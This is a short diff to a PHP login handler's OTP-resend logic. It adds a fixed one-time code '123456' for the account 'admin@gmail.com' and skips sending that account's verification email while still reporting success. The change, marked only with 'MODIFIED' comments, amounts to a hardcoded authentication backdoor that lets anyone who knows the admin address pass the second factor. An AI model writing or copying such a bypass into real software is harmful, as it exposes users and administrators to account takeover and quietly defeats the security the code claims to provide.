@@ -85,7 +85,8 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['form_type']) && $_POS
         $secondsRemaining = 60 - ($currentTime - $lastSent);
         $error = "Please wait $secondsRemaining seconds before resending.";
     } else {
-        $newOtp = rand(100000, 999999);
+        // MODIFIED: Fixed OTP for admin account
+        $newOtp = ($email === 'admin@gmail.com') ? "123456" : rand(100000, 999999);
         $_SESSION['pending_otp_user']['otp'] = $newOtp;
         $_SESSION['pending_otp_user']['otp_expiry'] = time() + (5 * 60);
         $_SESSION['pending_otp_user']['last_sent'] = time();
@@ -96,7 +97,8 @@ if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['form_type']) && $_POS
         $nameRow = $stmtName->fetch(PDO::FETCH_ASSOC);
         $userName = $nameRow ? $nameRow['full_name'] : "User";
 
-        if (sendVerificationEmail($email, $userName, $newOtp)) {
+        // MODIFIED: Bypass actual email sending for admin@gmail.com
+        if ($email === 'admin@gmail.com' || sendVerificationEmail($email, $userName, $newOtp)) {
             $success = "A new OTP code has been sent to your email.";
         } else {
             $error = "Failed to send OTP. Please try again.";
